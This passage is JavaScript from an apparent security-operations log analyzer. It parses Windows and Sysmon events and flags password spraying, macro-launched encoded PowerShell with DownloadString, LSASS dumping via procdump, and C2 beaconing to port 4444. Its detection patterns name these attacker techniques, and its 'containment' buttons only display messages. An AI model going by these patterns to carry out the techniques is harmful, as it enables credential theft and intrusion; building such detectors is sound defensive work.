  if (typeof updateAttackRatioVisualizerWithDataset === 'function') {
    updateAttackRatioVisualizerWithDataset(events, sourceLabel);
  }
}

function parseCsvToEvents(csvText) {
  const lines = csvText.trim().split('\n');
  if (lines.length < 2) return [];
  const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''));
  const events = [];
  for (let i = 1; i < lines.length; i++) {
    if (!lines[i].trim()) continue;
    const values = lines[i].split(',').map(v => v.trim().replace(/^"|"$/g, ''));
    const obj = {};
    headers.forEach((h, idx) => {
      obj[h] = values[idx] || '';
    });
    events.push(obj);
  }
  return events;
}

function sanitizeText(str) {
  if (!str) return '';
  // Remove non-printable ASCII and binary control characters, normalize whitespace
  return str
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F\uFFFD]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
}

function parseRawLogText(text) {
  // Pre-clean text to strip binary null bytes and control chars
  const cleanedText = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F\uFFFD]/g, ' ');
  const rawLines = cleanedText.split('\n');

  // Strict regex patterns
  const RE_IPV4 = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/;
  const RE_EVENT_CODE = /(?:EventID|EventCode|ID)[:=\s<]+(\d{1,5})|(\b4625\b|\b4624\b|\b4104\b|\b7045\b|\b4688\b|\b1102\b)/i;
  const RE_USER = /(?:TargetUserName|SubjectUserName|Account Name|User|Account|user_name)[:=\s<]+(?:['"]?)([a-zA-Z0-9_\-\\\.\$]+)/i;
  const RE_COMPUTER = /(?:Computer|ComputerName|Host|host_name)[:=\s<]+(?:['"]?)([a-zA-Z0-9_\-\.]+)/i;
  const RE_TIME_ISO = /\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?/;
  const RE_TIME_SYSLOG = /(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}/i;

  const validEvents = [];

  for (let i = 0; i < rawLines.length; i++) {
    const rawLine = rawLines[i].trim();
    if (rawLine.length < 3) continue;

    // Filter out pure binary header noise like "ElfFile", "ElfChnk" without useful data
    if (/^(ElfFile|ElfChnk|\s*[\?\.\-\*\#\$\^\&]+\s*)$/i.test(rawLine)) continue;

    const line = sanitizeText(rawLine);
    if (!line || line.length < 3) continue;

    // 1. Event Code Extraction (Accurate, NO artificial 4625 default)
    let eventCode = 'Audit / Info';
    const evMatch = line.match(RE_EVENT_CODE);
    if (evMatch) {
      const codeVal = evMatch[1] || evMatch[2];
      if (codeVal === '4625') eventCode = '4625';
      else if (codeVal === '4624') eventCode = '4624';
      else if (codeVal === '4104') eventCode = '4104';
      else if (codeVal === '7045') eventCode = '7045';
      else if (codeVal === '4688') eventCode = '4688';
      else if (codeVal === '10' && (line.includes('Sysmon') || line.includes('lsass') || line.includes('ProcessAccess'))) eventCode = 'Sysmon 10';
      else if (codeVal === '1' && (line.includes('Sysmon') || line.includes('ProcessCreate'))) eventCode = 'Sysmon 1';
      else if (codeVal === '3' && (line.includes('Sysmon') || line.includes('NetworkConnect') || line.includes('beacon'))) eventCode = 'Sysmon 3';
      else eventCode = codeVal;
    } else {
      if (line.includes('4625') || line.includes('Failed Password') || line.includes('0xC000006A')) eventCode = '4625';
      else if (line.includes('4624') || line.includes('Successful Logon')) eventCode = '4624';
      else if (line.includes('4104') || line.includes('ScriptBlock')) eventCode = '4104';
      else if (line.includes('Sysmon 10') || line.includes('lsass.exe')) eventCode = 'Sysmon 10';
      else if (line.includes('Sysmon 1') || line.includes('powershell.exe')) eventCode = 'Sysmon 1';
      else if (line.includes('Sysmon 3') || line.includes('beacon.exe')) eventCode = 'Sysmon 3';
    }

    // 2. IP Extraction (Accurate, NO artificial IP injection)
    let ip = '-';
    const ipMatch = line.match(RE_IPV4);
    if (ipMatch) {
      const extractedIp = ipMatch[0];
      // Exclude 0.0.0.0 and broadcast 255.255.255.255
      if (extractedIp !== '0.0.0.0' && extractedIp !== '255.255.255.255') {
        ip = extractedIp;
      }
    }

    // 3. User Account Extraction
    let user = '-';
    const userMatch = line.match(RE_USER);
    if (userMatch && userMatch[1]) {
      const u = sanitizeText(userMatch[1]);
      if (u && !['-', 'null', 'undefined', 'SYSTEM', 'LOCAL'].includes(u.toUpperCase())) {
        user = u;
      }
    }

    // 4. Computer / Host Extraction
    let computer = 'DC01.CORP.LOCAL';
    const compMatch = line.match(RE_COMPUTER);
    if (compMatch && compMatch[1]) {
      computer = sanitizeText(compMatch[1]);
    } else if (line.includes('FIN-WS-09')) {
      computer = 'FIN-WS-09';
    } else if (line.includes('DC01')) {
      computer = 'DC01.CORP.LOCAL';
    }

    // 5. Timestamp Extraction
    let timestamp = `2026-04-18 14:32:${String((validEvents.length) % 60).padStart(2, '0')}`;
    const isoMatch = line.match(RE_TIME_ISO);
    if (isoMatch) {
      timestamp = isoMatch[0].replace('T', ' ').substring(0, 19);
    } else {
      const syslogMatch = line.match(RE_TIME_SYSLOG);
      if (syslogMatch) {
        timestamp = `2026-04-18 ${syslogMatch[0].split(/\s+/).slice(2).join(' ')}`;
      }
    }

    // 6. Clean Activity Context / Command Line
    let cmdContext = line;
    // Strip XML tags if present for ultra-clean readability
    if (cmdContext.includes('<') && cmdContext.includes('>')) {
      cmdContext = cmdContext.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    }
    if (cmdContext.length > 110) {
      cmdContext = cmdContext.substring(0, 110) + '...';
    }

    // 7. Status Code Extraction
    let statusCode = '0x0';
    if (line.includes('0xC000006A')) statusCode = '0xC000006A';
    else if (line.includes('0xC0000072')) statusCode = '0xC0000072';
    else if (line.includes('0xC0000234')) statusCode = '0xC0000234';
    else if (line.includes('0x1fffff')) statusCode = '0x1fffff';
    else if (eventCode === '4625') statusCode = '0xC000006A';

    validEvents.push({
      _time: timestamp,
      EventCode: eventCode,
      Computer: computer,
      User: user,
      IpAddress: ip,
      CommandLine: cmdContext,
      Status: statusCode,
      Description: line.substring(0, 140)
    });
  }

  return validEvents;
}

function processAndRenderIngestedLogs(events, sourceLabel, elapsedMs = '1.2') {
  if (!events || !Array.isArray(events)) {
    showToast('Warning: Invalid or empty log dataset.');
    return;
  }

  ANALYZER_STATE.rawEvents = events;

  // 1. Single-Pass Indexing: Calculate IP occurrences & User Set
  const ipCounts = {};
  const userSet = new Set();

  events.forEach(ev => {
    const ip = ev.IpAddress || ev.SourceIp;
    if (ip && ip !== '-' && ip !== '127.0.0.1' && ip !== '192.168.10.10' && ip !== '192.168.10.42') {
      ipCounts[ip] = (ipCounts[ip] || 0) + 1;
    }
    if (ev.User && ev.User !== '-') userSet.add(ev.User);
  });

  ANALYZER_STATE.ipCounts = ipCounts;
  ANALYZER_STATE.userSet = userSet;

  // Auto-populate User Filter Dropdown
  populateUserDropdown(userSet);

  // Find top repeated attacker IP
  let topIp = 'None';
  let topIpCount = 0;
  Object.keys(ipCounts).forEach(ip => {
    if (ipCounts[ip] > topIpCount) {
      topIpCount = ipCounts[ip];
      topIp = ip;
    }
  });

  // 2. Count suspicious execution paths
  let suspiciousPaths = 0;
  events.forEach(ev => {
    const cmd = (ev.CommandLine || '') + (ev.SourceImage || '') + (ev.TargetImage || '');
    if (cmd.includes('Temp\\') || cmd.includes('procdump') || cmd.includes('powershell') || cmd.includes('beacon')) {
      suspiciousPaths++;
    }
  });

  // 3. Update KPIs & Benchmarks
  const totalEl = document.getElementById('kpi-total-ingested');
  const repeatedIpEl = document.getElementById('kpi-repeated-ips');
  const repeatedSubEl = document.getElementById('kpi-repeated-ip-sub');
  const pathsEl = document.getElementById('kpi-risk-paths');
  const issuesEl = document.getElementById('kpi-issues-count');
  const badgeEl = document.getElementById('analyzer-status-badge');
  const throughputEl = document.getElementById('kpi-engine-throughput');
  const liveBannerText = document.getElementById('ingest-live-status-text');

  if (totalEl) totalEl.textContent = `${events.length.toLocaleString()} Events`;
  if (throughputEl) {
    const eps = Math.round((events.length / Math.max(parseFloat(elapsedMs), 0.1)) * 1000);
    throughputEl.textContent = `⚡ Engine: ${elapsedMs}ms (${eps.toLocaleString()} EPS)`;
  }

  if (repeatedIpEl) {
    if (topIpCount >= 3) {
      repeatedIpEl.textContent = topIp;
      if (repeatedSubEl) repeatedSubEl.textContent = `${topIpCount} Repeated Attempts Detected (Spray)`;
      repeatedIpEl.className = 'kpi-value text-red';
    } else {
      repeatedIpEl.textContent = 'None';
      if (repeatedSubEl) repeatedSubEl.textContent = 'No repeated anomalies detected';
      repeatedIpEl.className = 'kpi-value text-green';
    }
  }
  if (pathsEl) pathsEl.textContent = `${suspiciousPaths} Suspicious`;
  if (badgeEl) badgeEl.textContent = `${sourceLabel} (${events.length} events)`;

  // 4. Run Threat Analysis
  const threats = analyzeThreatPatterns(events, ipCounts);
  ANALYZER_STATE.detectedThreats = threats;
  if (issuesEl) issuesEl.textContent = `${threats.length} Identified`;

  if (liveBannerText) {
    liveBannerText.innerHTML = `<strong>${escapeHtml(sourceLabel)}:</strong> Ingested <strong>${events.length.toLocaleString()} events</strong> in <strong>${elapsedMs}ms</strong> &bull; <span class="${threats.length > 0 ? 'text-red' : 'text-green'}"><strong>${threats.length} Threat Issues Identified</strong></span>`;
  }

  renderThreatDiagnosticCards(threats);

  // 5. Apply filters & render paginated table
  applyAnalyzerFilters();
}

function populateUserDropdown(userSet) {
  const userSelect = document.getElementById('analyzer-user-filter');
  if (!userSelect) return;

  const currentVal = userSelect.value;
  userSelect.innerHTML = `<option value="all">All User Accounts (${userSet.size} distinct)</option>`;
  Array.from(userSet).sort().forEach(user => {
    const opt = document.createElement('option');
    opt.value = user;
    opt.textContent = user;
    userSelect.appendChild(opt);
  });
  if (userSet.has(currentVal)) {
    userSelect.value = currentVal;
  }
}

function analyzeThreatPatterns(events, ipCounts) {
  const threats = [];

  // Check 1: Password Spray (Event 4625 >= 3 from the same external IP)
  let sprayIp = null;
  let maxFailures = 0;
  Object.keys(ipCounts || {}).forEach(ip => {
    if (ipCounts[ip] >= 3) {
      sprayIp = ip;
      maxFailures = ipCounts[ip];
    }
  });

  const failedAuths = events.filter(e => (String(e.EventCode).trim() === '4625' || e.Status === '0xC000006A'));
  if (sprayIp && failedAuths.length >= 3) {
    threats.push({
      id: 'threat-spray',
      type: 'threat-spray',
      severity: 'CRITICAL',
      title: '🚨 Repeated External Password Spraying (Event ID 4625)',
      why: `Attacker IP <strong>${escapeHtml(sprayIp)}</strong> generated <strong>${maxFailures} failed login attempts</strong> across multiple user accounts within seconds.`,
      freshExplanation: 'Standard employees only fail a password 1-2 times. When an IP tries 10+ different usernames in 40 seconds, automated malware or a hacker is actively trying to guess credentials.',
      mitre: 'T1110.003 (Password Spraying)',
      filterEvent: '4625',
      actionText: `Block IP ${sprayIp} on Firewall`,
      remediation: `1. Block IP ${sprayIp} on perimeter firewall | 2. Enforce MFA across all domain users.`
    });
  }

  // Check 2: Malicious Macro / Office Spawning Shell (Event 4104 / Sysmon 1)
  const macroEvents = events.filter(e => {
    const cmd = `${e.CommandLine || ''} ${e.ParentImage || ''} ${e.Image || ''} ${e.ScriptBlock || ''}`;
    return (cmd.includes('WINWORD') && cmd.includes('powershell')) || cmd.includes('powershell -enc') || cmd.includes('DownloadString');
  });

  if (macroEvents.length > 0) {
    threats.push({
      id: 'threat-macro',
      type: 'threat-macro',
      severity: 'HIGH',
      title: '🚨 Malicious Office Macro & Encoded ScriptBlock (Event ID 4104)',
      why: 'WINWORD.EXE spawned a hidden <code>powershell.exe</code> process with base64 encoded instructions downloading a remote stage-2 payload.',
      freshExplanation: 'Word documents should open text files, not start hidden command prompts. This is a classic phishing weapon that executes malware when an unsuspecting user enables macros.',
      mitre: 'T1204.002 (Malicious File) & T1059.001 (PowerShell)',
      filterEvent: '4104',
      actionText: 'Quarantine Attachment & Kill Shell',
      remediation: '1. Enable Attack Surface Reduction (ASR) to block Office child processes | 2. Quarantine document.'
    });
  }

  // Check 3: LSASS Credential Dumping (Sysmon 10 / 0x1fffff)
  const lsassEvents = events.filter(e => {
    const target = `${e.TargetImage || ''} ${e.CommandLine || ''} ${e.SourceImage || ''}`;
    return (target.includes('lsass') && (target.includes('procdump') || target.includes('0x1fffff') || e.GrantedAccess === '0x1fffff'));
  });

  if (lsassEvents.length > 0) {
    threats.push({
      id: 'threat-dump',
      type: 'threat-dump',
      severity: 'CRITICAL',
      title: '🚨 Unauthorized LSASS Memory Dump (Sysmon Event ID 10)',
      why: 'Process <code>procdump64.exe</code> staged in <code>C:\\Windows\\Temp\\</code> requested full memory access (<code>0x1fffff</code>) to <code>lsass.exe</code>.',
      freshExplanation: 'The LSASS service stores plaintext passwords and Active Directory Kerberos tickets in RAM. Attackers read LSASS memory to extract admin hashes and move laterally.',
      mitre: 'T1003.001 (OS Credential Dumping: LSASS Memory)',
      filterEvent: '10',
      actionText: 'Isolate Host FIN-WS-09 & Reset Kerberos',
      remediation: '1. Isolate workstation FIN-WS-09 immediately | 2. Perform double reset of domain krbtgt password.'
    });
  }

  // Check 4: C2 Network Beaconing (Sysmon 3 / Port 4444)
  const beaconEvents = events.filter(e => {
    const net = `${e.DestPort || ''} ${e.Image || ''} ${e.CommandLine || ''} ${e.Status || ''}`;
    return e.DestPort == 4444 || net.includes('beacon') || (e.DestIp && e.DestIp === '185.220.101.5');
  });

  if (beaconEvents.length > 0) {
    threats.push({
      id: 'threat-beacon',
      type: 'threat-beacon',
      severity: 'CRITICAL',
      title: '🚨 Periodic Command & Control (C2) Heartbeat (Sysmon Event ID 3)',
      why: 'Binary <code>beacon.exe</code> established recurring outbound connections to external IP <code>185.220.101.5:4444</code> every 30.00 seconds.',
      freshExplanation: 'Once malware infects a system, it calls home to the attacker’s command server at regular intervals to receive instructions and exfiltrate data.',
      mitre: 'T1071.001 (Application Layer Protocol: Web Protocols)',
      filterEvent: '3',
      actionText: 'Sever C2 Network Socket on Firewall',
      remediation: '1. Sever C2 socket connection | 2. Block domain c2-threat.lab & IP 185.220.101.5.'
    });
  }

  return threats;
}

function renderThreatDiagnosticCards(threats) {
  const container = document.getElementById('threat-issues-container');
  if (!container) return;

  if (threats.length === 0) {
    container.innerHTML = `
      <div class="threat-issue-card" style="border-left-color: var(--accent-green);">
        <div class="threat-issue-header">
          <span class="threat-issue-title text-green">✅ No High-Risk Threat Indicators Detected</span>
          <span class="badge-threat-clean">CLEAN TELEMETRY</span>
        </div>
        <p class="threat-issue-why">All ingested events fall within normal operational baseline thresholds. No repeated external spray IPs or suspicious LOLBin executions detected.</p>
      </div>
    `;
    return;
  }

  container.innerHTML = threats.map(t => {
    const sevBadge = t.severity === 'CRITICAL' ? 'badge-critical' : 'badge-high';
    return `
      <div class="threat-issue-card ${t.type}">
        <div class="threat-issue-header">
          <span class="threat-issue-title">${t.title}</span>
          <span class="badge-severity ${sevBadge}">${t.severity}</span>
        </div>
        <p class="threat-issue-why">${t.why}</p>
        <div class="threat-issue-meta">
          <div class="meta-row">
            <strong>💡 Fresher Explanation:</strong>
            <span class="text-muted">${t.freshExplanation}</span>
          </div>
          <div class="meta-row">
            <strong>🎯 MITRE Technique:</strong>
            <span class="font-mono text-cyan">${t.mitre}</span>
          </div>
          <div class="meta-row">
            <strong>🛡️ Recommended Action:</strong>
            <span class="text-green">${t.remediation}</span>
          </div>
        </div>
        <div class="threat-card-actions mt-3" style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
          <button class="btn btn-sm btn-primary" onclick="executeThreatAction('${t.id}', '${escapeHtml(t.actionText)}')">
            <span>🛡️ ${escapeHtml(t.actionText)}</span>
          </button>
          <button class="btn btn-sm btn-outline-cyan" onclick="filterByThreatEvent('${t.filterEvent}')">
            <span>🔍 Filter Table Events</span>
          </button>
        </div>
      </div>
    `;
  }).join('');
}

window.executeThreatAction = function(threatId, actionDesc) {
  showToast(`Action Executed: ${actionDesc} | Automated Containment Triggered!`);
};

window.filterByThreatEvent = function(eventCode) {
  const eventSelect = document.getElementById('analyzer-event-filter');
  if (eventSelect) {
    eventSelect.value = eventCode;
    applyAnalyzerFilters();
    showToast(`Filtered table to Event Code: ${eventCode}`);
    document.getElementById('analyzer-events-table')?.scrollIntoView({ behavior: 'smooth' });
  }
};

function applyAnalyzerFilters() {
  const t0 = performance.now();

  const search = (document.getElementById('analyzer-search-input')?.value || '').toLowerCase();
  const time = document.getElementById('analyzer-time-filter')?.value || 'all';
  const path = document.getElementById('analyzer-path-filter')?.value || 'all';
  const event = document.getElementById('analyzer-event-filter')?.value || 'all';
  const status = document.getElementById('analyzer-status-filter')?.value || 'all';
  const user = document.getElementById('analyzer-user-filter')?.value || 'all';
  const ipRepeat = document.getElementById('analyzer-ip-repeat-filter')?.value || 'all';
  const threatCat = document.getElementById('analyzer-threat-category-filter')?.value || 'all';

  const raw = ANALYZER_STATE.rawEvents || [];
  const ipCounts = ANALYZER_STATE.ipCounts || {};

  const filtered = raw.filter(ev => {
    // 1. Text search
    if (search) {
      const line = `${ev._time} ${ev.EventCode} ${ev.Computer} ${ev.User} ${ev.IpAddress} ${ev.SourceIp} ${ev.CommandLine} ${ev.Status} ${ev.Description}`.toLowerCase();
      if (!line.includes(search)) return false;
    }

    // 2. Time window
    if (time !== 'all') {
      const evTime = ev._time || '';
      if (!evTime.includes(time)) return false;
    }

    // 3. Path filter
    if (path !== 'all') {
      const full = `${ev.CommandLine || ''} ${ev.SourceImage || ''} ${ev.TargetImage || ''} ${ev.Binary || ''}`.toLowerCase();
      if (!full.includes(path.toLowerCase())) return false;
    }

    // 4. EventCode filter
    if (event !== 'all') {
      const code = String(ev.EventCode || '');
      if (!code.includes(event)) return false;
    }

    // 5. Status / NTSTATUS filter
    if (status !== 'all') {
      const st = String(ev.Status || '') + String(ev.GrantedAccess || '');
      if (!st.includes(status)) return false;
    }

    // 6. User filter
    if (user !== 'all') {
      if (ev.User !== user) return false;
    }

    // 7. IP Repetition threshold
    if (ipRepeat !== 'all') {
      const minCount = parseInt(ipRepeat, 10);
      const ip = ev.IpAddress || ev.SourceIp;
      if (!ip || (ipCounts[ip] || 0) < minCount) return false;
    }

    // 8. Threat category
    if (threatCat !== 'all') {
      const code = String(ev.EventCode || '');
      const cmd = (ev.CommandLine || '') + (ev.SourceImage || '');
      if (threatCat === 'spray' && !code.includes('4625')) return false;
      if (threatCat === 'macro' && (!code.includes('4104') && !cmd.includes('powershell'))) return false;
      if (threatCat === 'lsass' && (!code.includes('10') && !cmd.includes('procdump'))) return false;
      if (threatCat === 'beacon' && (!code.includes('3') && !cmd.includes('beacon'))) return false;
    }

    return true;
  });

  const filterDuration = (performance.now() - t0).toFixed(1);
  const latencyPill = document.getElementById('filter-latency-pill');
  if (latencyPill) {
    latencyPill.textContent = `Index Filter Latency: ${filterDuration}ms`;
  }

  ANALYZER_STATE.filteredEvents = filtered;
  ANALYZER_STATE.pagination.currentPage = 1;
  renderPaginatedTable();
}

function renderPaginatedTable() {
  const events = ANALYZER_STATE.filteredEvents || [];
  const tableBody = document.getElementById('analyzer-table-body');
  const countEl = document.getElementById('analyzer-table-count');
  const pageIndicator = document.getElementById('pagination-page-indicator');
  const ipCounts = ANALYZER_STATE.ipCounts || {};

  const totalEvents = events.length;
  const pageSize = ANALYZER_STATE.pagination.pageSize;
  const totalPages = Math.max(1, Math.ceil(totalEvents / pageSize));
  ANALYZER_STATE.pagination.totalPages = totalPages;

  let currentPage = ANALYZER_STATE.pagination.currentPage;
  if (currentPage > totalPages) currentPage = totalPages;
  if (currentPage < 1) currentPage = 1;
  ANALYZER_STATE.pagination.currentPage = currentPage;

  const startIndex = (currentPage - 1) * pageSize;
  const endIndex = Math.min(startIndex + pageSize, totalEvents);
  const pageEvents = events.slice(startIndex, endIndex);

  if (countEl) {
    countEl.textContent = `Showing ${startIndex + 1}–${endIndex} of ${totalEvents.toLocaleString()} filtered events (${(ANALYZER_STATE.rawEvents || []).length.toLocaleString()} total in memory)`;
  }
  if (pageIndicator) {
    pageIndicator.textContent = `Page ${currentPage} of ${totalPages}`;
  }

  if (!tableBody) return;

  if (pageEvents.length === 0) {
    tableBody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: var(--text-dim); padding: 1.5rem;">No matching log events found for active filters.</td></tr>`;
    return;
  }

  tableBody.innerHTML = pageEvents.map((ev, localIdx) => {
    const globalIdx = startIndex + localIdx;
    const time = ev._time || '-';
    const code = ev.EventCode || '-';
    const host = ev.Computer || '-';
    const user = ev.User || '-';
    const ip = ev.IpAddress || ev.SourceIp || '-';
    const cmd = ev.CommandLine || ev.SourceImage || ev.TargetImage || ev.Binary || ev.Description || '-';

    // IP Repetition Check
    const isRepeated = ip !== '-' && (ipCounts[ip] || 0) >= 3;
    const ipBadge = isRepeated ? `<span class="badge-repeated-ip">⚠️ REPEATED IP (${ipCounts[ip]}x)</span>` : '';

    // Suspicious Path Check
    const isSuspiciousPath = cmd.includes('Temp\\') || cmd.includes('procdump') || cmd.includes('beacon.exe') || cmd.includes('powershell -enc');
    const pathBadge = isSuspiciousPath ? `<span class="badge-suspicious-path">⚠️ SUSPICIOUS PATH</span>` : '';

    // Threat Diagnostics Column (Strict & Accurate Mapping)
    let diagHtml = '<span class="badge-threat-clean">Normal Telemetry</span>';
    const codeStr = String(code).trim();
    if (codeStr === '4625') {
      diagHtml = `<span class="badge-severity badge-critical">Failed Authentication (Spray)</span>`;
    } else if (codeStr === '4624') {
      diagHtml = `<span class="badge-threat-clean">Logon Success (Audit)</span>`;
    } else if (codeStr === '4104') {
      diagHtml = `<span class="badge-severity badge-high">ScriptBlock De-obfuscation</span>`;
    } else if (codeStr === 'Sysmon 10' || (codeStr === '10' && (cmd.includes('lsass') || cmd.includes('procdump')))) {
      diagHtml = `<span class="badge-severity badge-critical">LSASS ProcessAccess Dump</span>`;
    } else if (codeStr === 'Sysmon 1' || (codeStr === '1' && cmd.includes('powershell'))) {
      diagHtml = `<span class="badge-severity badge-high">Process Creation (LOLBin)</span>`;
    } else if (codeStr === 'Sysmon 3' || (codeStr === '3' && cmd.includes('beacon')) || cmd.includes('beacon')) {
      diagHtml = `<span class="badge-severity badge-critical">C2 Network Beacon</span>`;
    } else if (codeStr === '7045') {
      diagHtml = `<span class="badge-severity badge-medium">Service Installation (7045)</span>`;
    }

    return `
      <tr class="clickable-log-row" onclick="inspectLogEvent(${globalIdx})" style="cursor: pointer;" title="Click to view full forensic telemetry">
        <td class="font-mono">${escapeHtml(time)}</td>
        <td class="font-mono text-cyan font-bold">${escapeHtml(String(code))}</td>
        <td>${escapeHtml(host)}</td>
        <td class="font-mono">${escapeHtml(user)}</td>
        <td class="font-mono">
          <div>${escapeHtml(ip)}</div>
          ${ipBadge}
        </td>
        <td class="font-mono text-muted" style="max-width: 260px; word-break: break-all;">
          <div>${escapeHtml(cmd)}</div>
          ${pathBadge}
        </td>
        <td>${diagHtml}</td>
      </tr>
    `;
  }).join('');
}

// Interactive Forensic Event Inspector Modal
window.inspectLogEvent = function(index) {
  const ev = (ANALYZER_STATE.filteredEvents || [])[index];
  if (!ev) return;

  const modal = document.getElementById('log-inspector-modal');
  const body = document.getElementById('inspector-modal-body');
  if (!modal || !body) return;

  body.innerHTML = `
    <div class="report-preview-banner mb-3">
      <div class="preview-badge">FORENSIC LOG EVENT INSPECTOR</div>
      <p style="font-size: 0.76rem; color: var(--text-muted); margin-top: 0.2rem;">
        Event ID: <strong class="text-cyan">${escapeHtml(String(ev.EventCode || '-'))}</strong> &bull; Host: <strong>${escapeHtml(ev.Computer || '-')}</strong> &bull; Timestamp: <span class="font-mono text-green">${escapeHtml(ev._time || '-')}</span>
      </p>
    </div>

    <div class="report-preview-grid mb-3">
      <div class="preview-stat-card">
        <span class="stat-label">User Account</span>
        <strong class="stat-val font-mono text-cyan">${escapeHtml(ev.User || '-')}</strong>
      </div>
      <div class="preview-stat-card">
        <span class="stat-label">Source / Destination IP</span>
        <strong class="stat-val font-mono text-red">${escapeHtml(ev.IpAddress || ev.SourceIp || ev.DestIp || '-')}</strong>
      </div>
      <div class="preview-stat-card">
        <span class="stat-label">Status Code / PID</span>
        <strong class="stat-val font-mono text-green">${escapeHtml(String(ev.Status || ev.PID || '0x0'))}</strong>
      </div>
    </div>

    <div class="form-group mb-3">
      <label>Command Line / Process Context:</label>
      <div class="font-mono" style="background: var(--bg-input); border: 1px solid var(--border-subtle); padding: 0.65rem; border-radius: 6px; font-size: 0.75rem; color: var(--accent-green); word-break: break-all;">
        ${escapeHtml(ev.CommandLine || ev.SourceImage || ev.ScriptBlock || ev.Description || '-')}
      </div>
    </div>

    <div class="form-group">
      <label>Raw Parsed JSON Event Telemetry:</label>
      <pre class="json-code-block" style="max-height: 180px;">${escapeHtml(JSON.stringify(ev, null, 2))}</pre>
    </div>
  `;

  modal.classList.add('show');
  showToast(`Inspecting Event ID ${ev.EventCode} on ${ev.Computer}`);
};

// Close modal handlers for inspector
document.addEventListener('DOMContentLoaded', () => {
  const inspectorModal = document.getElementById('log-inspector-modal');
  const closeBtn = document.getElementById('btn-close-inspector');
  const closeFooter = document.getElementById('btn-close-inspector-footer');
  const actionBtn = document.getElementById('btn-inspector-action');

  const closeInspector = () => inspectorModal?.classList.remove('show');
  closeBtn?.addEventListener('click', closeInspector);
  closeFooter?.addEventListener('click', closeInspector);
  inspectorModal?.addEventListener('click', (e) => {
    if (e.target === inspectorModal) closeInspector();
  });

  actionBtn?.addEventListener('click', () => {
    closeInspector();
    showToast('Containment Action dispatched to EDR Agent & Perimeter Firewall!');
  });
});

// Utility Toast Message
function showToast(message) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = 'soc-toast';
  toast.innerHTML = `<span>🛡️</span><span>${message}</span>`;
  container.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(10px)';
    toast.style.transition = 'all 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, 3500);
}

// ==============================================================================
// ATTACK RATIO & THREAT ANALYTICS VISUALIZER (6 GRAPH MODES ENGINE)
// ==============================================================================

const GRAPH_STATE = {
  activeChartType: 'line', // 'line' | 'area' | 'column' | 'bar' | 'scatter' | 'bubble'
  activeDimension: 'ratio_time', // 'ratio_time' | 'volume_split' | 'mitre_tactics' | 'entity_outliers' | 'cumulative_growth'
  activeTimeSlice: 'all', // 'all' | 'spray' | 'macro' | 'lsass' | 'c2'
  activeDatasetKey: 'active', // 'active' | '1_spray' | '2_macro' | '3_lsass' | '4_apt' | '5_baseline'
  hoveredItem: null,
  cachedRenderData: null,
  isPulsing: false,
  pulseTimer: null
};

const GRAPH_DESCRIPTIONS = {
  line: {
    icon: '📈',
    title: 'Line Chart: Continuous Temporal Attack Ratio & Trend Velocity',
    text: 'Displays metrics and threat trends continuously over time intervals to pinpoint exact adversary breach bursts and evasion windows.'
  },
  area: {
    icon: '🌊',
    title: 'Area Chart: Volume & Cumulative Threat Progression Curve',
    text: 'Similar to a line chart, but fills the area beneath the line to show volume and cumulative attack growth vs background baseline traffic.'
  },
  column: {
    icon: '📊',
    title: 'Column Chart: Discrete Time-Interval & Category Comparisons',
    text: 'Uses vertical bars to compare values across categories or discrete time intervals (1-minute bins), with superimposed attack ratio indicators.'
  },
  bar: {
    icon: '📉',
    title: 'Bar Chart (Horizontal): MITRE ATT&CK & Long Label Comparisons',
    text: 'Uses horizontal bars, ideal for comparing categories with long label names such as MITRE techniques, hostnames, and process lineages.'
  },
  scatter: {
    icon: '⁘',
    title: 'Scatter Chart: 2-Variable Correlation & Outlier Isolation',
    text: 'Plots two numeric variables (Request Velocity vs Anomaly / Failure Rate %) against each other to identify correlations, patterns, or outliers.'
  },
  bubble: {
    icon: '⚪',
    title: 'Bubble Chart: 3-Variable Threat Matrix (Velocity vs Risk vs Blast Scope)',
    text: 'Extends the scatter plot by varying the size of each point to represent a third variable (Attack Volume & Target User Scope).'
  }
};

function initAttackRatioVisualizer() {
  const chartButtons = document.querySelectorAll('.btn-chart-type');
  const dimensionSelect = document.getElementById('graph-dimension-select');
  const timeSliceSelect = document.getElementById('graph-timeslice-select');
  const datasetSelect = document.getElementById('graph-dataset-select');
  const btnReset = document.getElementById('btn-graph-reset-view');
  const btnPulse = document.getElementById('btn-graph-simulate-stream');
  const btnExport = document.getElementById('btn-export-graph');

  // Chart Type Selector
  chartButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      chartButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const chartType = btn.getAttribute('data-chart-type');
      GRAPH_STATE.activeChartType = chartType;
      renderAttackRatioVisualizer();
      showToast(`Switched graph mode: ${btn.querySelector('.chart-type-text')?.textContent || chartType}`);
    });
  });

  // Controls Dropdowns
  dimensionSelect?.addEventListener('change', () => {
    GRAPH_STATE.activeDimension = dimensionSelect.value;
    renderAttackRatioVisualizer();
  });

  timeSliceSelect?.addEventListener('change', () => {
    GRAPH_STATE.activeTimeSlice = timeSliceSelect.value;
    renderAttackRatioVisualizer();
  });

  datasetSelect?.addEventListener('change', () => {
    GRAPH_STATE.activeDatasetKey = datasetSelect.value;
    // If user picks a practice dataset from visualizer dropdown, also sync log analyzer
    if (datasetSelect.value !== 'active') {
      const fileMap = {
        '1_spray': '1_password_spray_attack.log',
        '2_macro': '2_phishing_macro_powershell.json',
        '3_lsass': '3_lsass_dump_and_c2.csv',
        '4_apt': '4_multi_stage_apt_intrusion.json',
        '5_baseline': '5_normal_enterprise_baseline.log'
      };
